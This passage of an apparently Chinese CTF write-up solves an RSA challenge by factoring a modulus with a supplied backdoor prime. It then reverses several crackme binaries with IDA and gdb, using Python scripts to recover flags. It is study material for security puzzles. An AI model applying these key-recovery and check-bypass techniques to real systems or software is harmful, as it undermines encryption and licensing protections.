n=<span class="hljs-number">0x74fa9956e470bfa8501b4ff98ce6687ba37e2b7ce5592ff61c96379c1df04f2af91ab7b9da4935dc1a9860b203e0012bd7855845ad51d28b221d3eeb5d841bd65247ab39aab7635d3767e439e930127c20b6dc2bbf526de67d1f2cbbe798c031665dbb033a07247966b0f9988aac0d7ff7736d6cd39d35f74a88956c9b8d1c7b4177195ff50bab7e9af211c9e09c7b6345733fb41380c678bc1d0b80f21eb80d3bb2338f2da692bb588a853eea2bfd9091d31e7d14aa504f4073a1afb819e8edc336755e29ca11852d8efc0bd8f1d454ae4a698fd18e1edaa8649a6077fd3a4638b6aafbe1eb37a78aff52e8a056c92ddf4ed1f3cbeab89748b95ef09f70d1d7L</span>
c=<span class="hljs-string">'O7P6yC21fCJYE8NbvkNnmxQihBUYIBpHz606MZeUZW14C0SA8CFcm+RaOTTftwJyEhlW7x1KeIG7ZGsd0HeRhcb3/wJIkY7dPmywHxv+78tlHSUtxEsS4dT/fY3Hxj1hrP75ZjQ24r3wM0PsY79G9MIDvVqg3p2NybP0NYxXhfZGJHNELlubpcGGW/YtZIGYX8QXtOZZvbVdQBL0xBrBxzZNTUGIJjCUY5+RxuAITsbDVwTi1QX2SSv28p6+vgmpkul/rL9pXQk0M6CKKI+SWJjFaKrtSlYho5o/tGSISi74taq0r4Jef/zlctbYg6oy4qRUp4Qs+l5RYokPKaYIaN'</span>
backdoor_p=<span class="hljs-number">0x76d72e0b530ed5c3cf09273bb1e452f913ef648420a003d9f08ee8bdbc96f6bf999a3f51f08fa3c9bb2434374f41a201c7d5fc6ffec50c3bc32c84a6c21dff5f7a567558e3b82aef4c4c301c2c3d7c6657fb3135a032302c772842956582224dcef66f8c812c57f6902adc0edb97d80d8feffb2d06951741a31c3a992bf5e79f430b02300a39834c97a683c665566dadaaff771fd5278ce1001cd9cde888c319c909d15b0ce3d6fa871f674541cb2a78c6edf058335cbbf1cfc54ecf441da7baaf46d6903eacb8fcfa32602dec3a4aa50e60cc51f49042bb4681bbf0f16ec6fd0241ddf697cf224de602aeb5276c02a27f39a4853cd044cdee6dc216ed497b1bL</span>
k = <span class="hljs-string">''</span>
q = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
    p = gcd(backdoor_p^i,n)
    <span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span>:
        k = i
        <span class="hljs-keyword">break</span>
<span class="hljs-comment">#print p</span>
q = n/p
f_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)
e=<span class="hljs-number">65537</span>
d=invmod(e,f_n)
<span class="hljs-keyword">print</span> d

myl=string.printable[<span class="hljs-number">0</span>:<span class="hljs-number">62</span>]+<span class="hljs-string">"+/"</span>
nell=[<span class="hljs-string">""</span>]*<span class="hljs-number">64</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">64</span>):
    nell[(i+k)%<span class="hljs-number">64</span>]=myl[i] <span class="hljs-comment">#copy myl to nell</span>
nel=<span class="hljs-string">""</span>.join(nell)
bs = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c[:-<span class="hljs-number">1</span>]:
    d1 = nell.index(i)
    bs += <span class="hljs-string">'0'</span>*(<span class="hljs-number">6</span>-len(bin(d1)[<span class="hljs-number">2</span>:]))+bin(d1)[<span class="hljs-number">2</span>:]
bs += bin(nell.index(c[-<span class="hljs-number">1</span>:]))[<span class="hljs-number">2</span>:]


msg = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(bs),<span class="hljs-number">8</span>):
    msg += chr(int(bs[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))
msg = bytes_to_long(msg)
<span class="hljs-keyword">print</span> msg
<span class="hljs-comment">#print string</span>
<span class="hljs-keyword">print</span> hex(pow(msg,d,n))[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">'hex'</span>)</code></pre>
<p>这一题逻辑上比较简单</p>
<h1 id="reverse">reverse</h1>
<h2 id="1warmup-re">1.warmup-re</h2>
<p>Hint1: username:goodgoodstudydaydayup  <br>
拖进IDA中直接F5</br></p>
<pre class="prettyprint"><code class=" hljs ruby"><span class="hljs-keyword">if</span> ( v15 &gt;= v16 )
    <span class="hljs-keyword">break</span>;
  v44 = v19[i];
  v43 = v2<span class="hljs-number">0</span>[i];
  v21[i] = v43 ^ v44;
  v9 = (unsigned int)v21[i];
  <span class="hljs-keyword">if</span> ( (_DWORD)v9 != *(&amp;v22 + i) )
  {
    <span class="hljs-constant">LODWORD</span>(v13) = <span class="hljs-symbol">std:</span><span class="hljs-symbol">:operator&lt;&lt;&lt;std</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:char_traits&lt;char&gt;&gt;</span>(*(_QWORD *)&amp;argc, argv, <span class="hljs-string">"key error"</span>, refptr__ZSt4cout);
    <span class="hljs-symbol">std:</span><span class="hljs-symbol">:ostream</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:operator&lt;&lt;</span>(
      *(_QWORD *)&amp;argc,
      argv,
      refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6<span class="hljs-number">_</span>,
      v13);
    system(*(_QWORD *)&amp;argc, argv, v14, <span class="hljs-string">"pause"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
  }
}
<span class="hljs-constant">LODWORD</span>(v17) = <span class="hljs-symbol">std:</span><span class="hljs-symbol">:operator&lt;&lt;&lt;std</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:char_traits&lt;char&gt;&gt;</span>(
                 *(_QWORD *)&amp;argc,
                 argv,
                 <span class="hljs-string">"Yes!input is flag"</span>,
                 refptr__ZSt4cout);         </code></pre>
<p>分析得到： <br>
只需将代码中的数与username的值异或即可</br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">s = <span class="hljs-string">'goodgoodstudydaydayup'</span>
<span class="hljs-operator">a</span> = [<span class="hljs-number">86</span>, <span class="hljs-number">30</span>,  <span class="hljs-number">24</span>,  <span class="hljs-number">1</span>,  <span class="hljs-number">21</span>,  <span class="hljs-number">90</span>,  <span class="hljs-number">27</span>,  <span class="hljs-number">29</span>, <span class="hljs-number">6</span>,  <span class="hljs-number">29</span>,  <span class="hljs-number">76</span>,  <span class="hljs-number">84</span>,  <span class="hljs-number">22</span>,  <span class="hljs-number">20</span>,  <span class="hljs-number">85</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">22</span>,  <span class="hljs-number">21</span>,  <span class="hljs-number">30</span>,<span class="hljs-number">29</span>,  <span class="hljs-number">23</span>]
l = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):
    l = l + chr(<span class="hljs-operator">a</span>[i]^ord(s[i]))
print l</code></pre>
<h2 id="2android">2.android</h2>
<p>直接用jeb反汇编 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226132332996?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
找到m字符串 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226132610360?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
找到其中的12~24位即得flag</br></img></br></br></img></br></p>
<h2 id="3crackme">3.CrackMe</h2>
<p>IDA进去之后 <br>
四关 <br>
1.输入素数 <br>
直接看代码分析出为2 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20161226154859623?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
2.计算数字 <br>
用c语言代码计算得出为654321 <br>
3.计算字符串</br></br></br></img></br></br></br></br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">d = <span class="hljs-string">''</span>
s = <span class="hljs-string">'MerryChristmas'</span>
<span class="hljs-operator">a</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">14</span>):
    d = d + chr(ord(s[i])-<span class="hljs-operator">a</span>[i])
print d
</code></pre>
<p>4.计算flag的值</p>
<pre class="prettyprint"><code class=" hljs vhdl">s = <span class="hljs-attribute">'Lcont</span>=gpfoog`q'

flag = <span class="hljs-number">654323</span>
tmp = <span class="hljs-number">0x1E240</span>
<span class="hljs-keyword">mod</span> = <span class="hljs-number">0x3B9ACA07</span>
#flag = (flag + (<span class="hljs-typename">signed</span> int)v5 * tmp) % <span class="hljs-keyword">mod</span>;

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">14</span>):
    flag = (flag + ord(s[i]) * tmp) % <span class="hljs-keyword">mod</span>
print flag</code></pre>
<p>直接输入flag的值，会给出flag</p>
<h2 id="461dre">4.61dre</h2>
<p>为linux下程序，先拖入IDA简单看一下发现代码比较复杂，判断条件，跳转都比较多，处理字符串的主要程序在：</p>
<pre class="prettyprint"><code class=" hljs perl"> <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
  {
    v5 = (<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>];
    v13 = <span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>;
    v6 = strlen(v5);
    <span class="hljs-keyword">if</span> ( v13 &gt;= v6 )
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">if</span> ( !(((unsigned __int8)((<span class="hljs-keyword">y</span> &lt; <span class="hljs-number">10</span>) ^ ((((_BYTE)<span class="hljs-keyword">x</span> - <span class="hljs-number">1</span>) * (_BYTE)<span class="hljs-keyword">x</span> &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)) | (<span class="hljs-keyword">y</span> &lt; <span class="hljs-number">10</span>
                                                                                 &amp;&amp; (((_BYTE)<span class="hljs-keyword">x</span> - <span class="hljs-number">1</span>) * (_BYTE)<span class="hljs-keyword">x</span> &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)) &amp; <span class="hljs-number">1</span>) )
      <span class="hljs-keyword">goto</span> LABEL_24;
    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
    {
      s1[<span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>] = (<span class="hljs-variable">*(</span>_BYTE <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span> &amp; <span class="hljs-number">0x89</span> | ~<span class="hljs-variable">*(</span>_BYTE <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span> &amp; <span class="hljs-number">0x76</span>) ^ ((<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>][<span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x89</span> | ~(<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>][<span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x76</span>);
      <span class="hljs-keyword">if</span> ( ((unsigned __int8)((<span class="hljs-keyword">y</span> &lt; <span class="hljs-number">10</span>) ^ ((((_BYTE)<span class="hljs-keyword">x</span> - <span class="hljs-number">1</span>) * (_BYTE)<span class="hljs-keyword">x</span> &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)) | (<span class="hljs-keyword">y</span> &lt; <span class="hljs-number">10</span>
                                                                                 &amp;&amp; (((_BYTE)<span class="hljs-keyword">x</span> - <span class="hljs-number">1</span>) * (_BYTE)<span class="hljs-keyword">x</span> &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)) &amp; <span class="hljs-number">1</span> )
        <span class="hljs-keyword">break</span>;
LABEL_24:
      s1[<span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>] = (<span class="hljs-variable">*(</span>_BYTE <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span> &amp; <span class="hljs-number">0x38</span> | ~<span class="hljs-variable">*(</span>_BYTE <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span> &amp; <span class="hljs-number">0xC7</span>) ^ ((<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>][<span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0x38</span> | ~(<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>][<span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xC7</span>);
    }
    <span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span> = <span class="hljs-variable">*(</span>_DWORD <span class="hljs-variable">*)</span>v2<span class="hljs-number">0</span> - <span class="hljs-number">403331085</span> + <span class="hljs-number">403331086</span>;
  }
  v7 = strlen((<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>]);
  v8 = s1;
  s1[v7] = <span class="hljs-number">0</span>;
  v9 = <span class="hljs-variable">*v16</span>;
  <span class="hljs-keyword">if</span> ( !strcmp(v8, <span class="hljs-variable">*v16</span>) )
    HIDWORD(v12) = <span class="hljs-keyword">printf</span>(<span class="hljs-string">"yes\n"</span>, v9, v12);
  <span class="hljs-keyword">do</span>
    v1<span class="hljs-number">0</span> = (((_BYTE)<span class="hljs-keyword">x</span> - <span class="hljs-number">1</span>) * (_BYTE)<span class="hljs-keyword">x</span> &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>;
  <span class="hljs-keyword">while</span> ( !(((<span class="hljs-keyword">y</span> &lt; <span class="hljs-number">10</span> &amp;&amp; v1<span class="hljs-number">0</span>) | (unsigned __int8)((<span class="hljs-keyword">y</span> &lt; <span class="hljs-number">10</span>) ^ v1<span class="hljs-number">0</span>)) &amp; <span class="hljs-number">1</span>) );
  <span class="hljs-variable">*v19</span> = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-variable">*v19</span>;
}</code></pre>
<p>其中：</p>
<pre class="prettyprint"><code class=" hljs perl">  <span class="hljs-keyword">if</span> ( !strcmp(v8, <span class="hljs-variable">*v16</span>) )
    HIDWORD(v12) = <span class="hljs-keyword">printf</span>(<span class="hljs-string">"yes\n"</span>, v9, v12);</code></pre>
<p>这里是将输入的字符串经过一定的处理然后与程序中的一段内存中的字符进行比较，匹配则输出yes <br>
内存中的字符串不是动态加载的，可以看到： <br>
注意要看ascii码，因为有些字符是不可见的 <br>
处理输入的字符串的可能性有两种，分别是</br></br></br></p>
<pre class="prettyprint"><code class=" hljs fsharp"> <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
    {
      s1[*(_DWORD *)v20] = <span class="hljs-comment">(*(_BYTE *)</span>v20 &amp; <span class="hljs-number">0x89</span> | ~*(_BYTE *)v20 &amp; <span class="hljs-number">0x76</span>) ^ (<span class="hljs-comment">(*v17)[1][*(_DWORD *)</span>v20] &amp; <span class="hljs-number">0x89</span> | ~<span class="hljs-comment">(*v17)[1][*(_DWORD *)</span>v20] &amp; <span class="hljs-number">0x76</span>);
      <span class="hljs-keyword">if</span> ( ((unsigned __int8)((y &lt; <span class="hljs-number">10</span>) ^ ((((_BYTE)x - <span class="hljs-number">1</span>) * (_BYTE)x &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)) | (y &lt; <span class="hljs-number">10</span>
                                                                                 &amp;&amp; (((_BYTE)x - <span class="hljs-number">1</span>) * (_BYTE)x &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)) &amp; <span class="hljs-number">1</span> )
        break;
LABEL_24:
      s1[*(_DWORD *)v20] = <span class="hljs-comment">(*(_BYTE *)</span>v20 &amp; <span class="hljs-number">0x38</span> | ~*(_BYTE *)v20 &amp; <span class="hljs-number">0xC7</span>) ^ (<span class="hljs-comment">(*v17)[1][*(_DWORD *)</span>v20] &amp; <span class="hljs-number">0x38</span> | ~<span class="hljs-comment">(*v17)[1][*(_DWORD *)</span>v20] &amp; <span class="hljs-number">0xC7</span>);
    }</code></pre>
<p>但是具体用哪种方式，要根据if语句判断，if判断的具体结果没法直接看到，因为x，y是未知的，要根据动态调试时的具体值判断。 <br>
这里发现if判断恰好相反，分析可知起到了给v20赋值的作用 <br>
还有一处比较重要：</br></br></p>
<pre class="prettyprint"><code class=" hljs perl"> <span class="hljs-keyword">if</span> ( strlen((<span class="hljs-variable">*v17</span>)[<span class="hljs-number">1</span>]) != <span class="hljs-number">32</span> )</code></pre>
<p>这里说明附加的参数是32位，否则就会退出了 <br>
使用gdb调试： <br>
- 注意要附加32位的参数 <br>
- 注意提前设置断点，否则程序没有停止，会直接结束。 <br>
<code>b main</code> <br>
首先查看未知的x，y的值</br></br></br></br></br></p>
<pre class="prettyprint"><code class=" hljs ">p x
p y</code></pre>
<p>在继续执行的过程中，发现x，y也一直为0</p>
<p>根据各个判断条件的位置，设置断点跟踪跳转情况，发现各个判断条件的结果是固定的，并且每次执行的字符串处理函数都是第一个： <br>
分析该语句 <br>
<code>s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);</code> <br>
主要是对字符(s)及其对应位置数字(i)的一些操作， <br>
<code>s1[i] = (i&amp;0x89|(~i)&amp;0x76)^(s[i]&amp;0x89|s[i]&amp;0x89|(~s[i])&amp;0x76)</code> <br>
发现他是可逆的运算，那么就反过来解密一下就能出来flag <br>
注意逻辑运算优先级，同时注意到0x89与0x76的二进制码是互补的 <br>
进行该操作后，字符会与之前找到的程序存储的一段字符相匹配，逆向算法得到解密代码：</br></br></br></br></br></br></br></p>
<pre class="prettyprint"><code class=" hljs matlab">s = <span class="hljs-matrix">[<span class="hljs-number">0x36</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x7C</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x7A</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x62</span>]</span>
s1 = <span class="hljs-matrix">[]</span>
<span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> in range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):
    <span class="hljs-transposed_variable">s1.</span>append(chr((<span class="hljs-built_in">i</span>&amp;<span class="hljs-number">0x89</span>|(~<span class="hljs-built_in">i</span>)&amp;<span class="hljs-number">0x76</span>)^(s<span class="hljs-matrix">[i]</span>&amp;<span class="hljs-number">0x89</span>|s<span class="hljs-matrix">[i]</span>&amp;<span class="hljs-number">0x89</span>|(~s<span class="hljs-matrix">[i]</span>)&amp;<span class="hljs-number">0x76</span>)))
print s1</code></pre>
<h2 id="5reverse1">5.Reverse1</h2>
<p>IDA F5反编译main函数发现有一个encrypto加密函数，其关键代码如下:</p>
<pre class="prettyprint"><code class=" hljs cpp"> LODWORD(v16) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, <span class="hljs-number">0L</span>L);
  <span class="hljs-keyword">while</span> ( *v16 )
  {
    LODWORD(v2) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
    v3 = *v2;
    LODWORD(v4) = <span class="hljs-built_in">std</span>::<span class="hljs-stl_container"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;</span>&gt;::<span class="hljs-keyword">operator</span>[](&amp;primos, v19);
    v18 = v3 + *v4;
    LODWORD(v5) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)is_lower(*v5) )
    {
      v6 = <span class="hljs-number">122</span>;
    }
    <span class="hljs-keyword">else</span>
    {
      LODWORD(v7) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
      <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)is_upper(*v7) )
      {
        v6 = <span class="hljs-number">90</span>;
      }
      <span class="hljs-keyword">else</span>
      {
        LODWORD(v8) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
        v6 = *v8;
      }
    }
    <span class="hljs-keyword">while</span> ( v18 &gt; v6 )
      v18 -= <span class="hljs-number">26</span>;
    LODWORD(v9) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
    v10 = v9;
    LODWORD(v11) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
    <span class="hljs-keyword">if</span> ( *v11 == <span class="hljs-number">123</span> )
    {
      v14 = <span class="hljs-number">125</span>;
    }
    <span class="hljs-keyword">else</span>
    {
      LODWORD(v12) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
      <span class="hljs-keyword">if</span> ( *v12 == <span class="hljs-number">125</span> )
      {
        v14 = <span class="hljs-number">123</span>;
      }
      <span class="hljs-keyword">else</span>
      {
        LODWORD(v13) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)is_alphabet(*v13) )
        {
          v14 = v18;
        }
        <span class="hljs-keyword">else</span>
        {
          LODWORD(v15) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, v19);
          v14 = *v15;
        }
      }
    }
    *v10 = v14;
    LODWORD(v16) = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::<span class="hljs-keyword">operator</span>[](a2, ++v19);
  }</code></pre>
<p>这个代码有一个关键位置在于 *v4值不好确定，即primos数组的值实在运行后才复制过去的，我们很难确定，但是发现程序有一个init()函数  <br>
其内容为:</br></p>
<pre class="prettyprint"><code class=" hljs cpp">__int64 initial(<span class="hljs-keyword">void</span>)
{
  __int64 result; <span class="hljs-comment">// rax@10</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [sp+4h] [bp-Ch]@4</span>
  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> k; <span class="hljs-comment">// [sp+8h] [bp-8h]@6</span>
  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [sp+Ch] [bp-4h]@1</span>
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-number">1023</span>; ++i )
    ehprimo[(<span class="hljs-keyword">signed</span> __int64)i] = (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">3</span>; ; j += <span class="hljs-number">2</span> )
  {
    result = j;
    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)j &gt; <span class="hljs-number">1023</span> )
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">if</span> ( ehprimo[(<span class="hljs-keyword">signed</span> __int64)(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)j] )
    {
      <span class="hljs-built_in">std</span>::<span class="hljs-stl_container"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-keyword">int</span>&gt;</span>&gt;::push_back(&amp;primos, &amp;j);
      <span class="hljs-keyword">for</span> ( k = j * j; (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)k &lt;= <span class="hljs-number">1023</span>; k += j )
        ehprimo[(<span class="hljs-keyword">signed</span> __int64)(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)k] = <span class="hljs-number">0</span>;
    }
  }
  <span class="hljs-keyword">return</span> result;
}</code></pre>
<p>简而言之就是在该内存上打出了一个素数表，我是通过gdb动态调试到encrypto函数后查看内存找到了该数组的值(pass:进入encrypto()说明init()已经生成完毕)  <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170201225842389?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现了地址为0x6160e0,素数表 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170201230656876?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
写出自己的exploit：</br></img></br></br></img></br></p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># coding=utf8</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prime</span><span class="hljs-params">()</span>:</span>
    p = []
    flag = <span class="hljs-number">0</span>
    j = <span class="hljs-number">3</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,j):
            <span class="hljs-keyword">if</span> j%i == <span class="hljs-number">0</span>:
                <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment">#print j</span>
            flag += <span class="hljs-number">1</span>
            p.append(j)
        j += <span class="hljs-number">1</span>
        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">33</span>:
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">return</span> p
s = <span class="hljs-string">"LNLNGW}o3A3g5Z_1b_Xv5d_WbzgGnbG{"</span>
p = prime()
ds = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):
    <span class="hljs-keyword">if</span> s[i] == <span class="hljs-string">"{"</span>:
        ds += <span class="hljs-string">"}"</span>
    <span class="hljs-keyword">elif</span> s[i] == <span class="hljs-string">"}"</span>:
        ds += <span class="hljs-string">"{"</span>
    <span class="hljs-keyword">elif</span> s[i] &gt;= <span class="hljs-string">'A'</span> <span class="hljs-keyword">and</span> s[i] &lt;= <span class="hljs-string">'Z'</span> <span class="hljs-keyword">or</span> s[i] &gt;= <span class="hljs-string">'a'</span> <span class="hljs-keyword">and</span> s[i] &lt;= <span class="hljs-string">'z'</span>:
        lager = <span class="hljs-number">0</span>
        lower = <span class="hljs-number">0</span>
        <span class="hljs-keyword">if</span> s[i] &lt;= <span class="hljs-string">'Z'</span>:<span class="hljs-comment">#大写</span>
            lager = ord(s[i])-p[i]
            <span class="hljs-keyword">while</span>(lager &lt; ord(<span class="hljs-string">'A'</span>)):
                lager += <span class="hljs-number">26</span>
            ds += chr(lager)
        <span class="hljs-keyword">else</span>:
            lower = ord(s[i])-p[i]
            <span class="hljs-keyword">while</span>(lower &lt; ord(<span class="hljs-string">'a'</span>)):
                lower += <span class="hljs-number">26</span>
            ds += chr(lower)

    <span class="hljs-keyword">else</span>:
        ds += s[i]
<span class="hljs-keyword">print</span> ds</code></pre></div>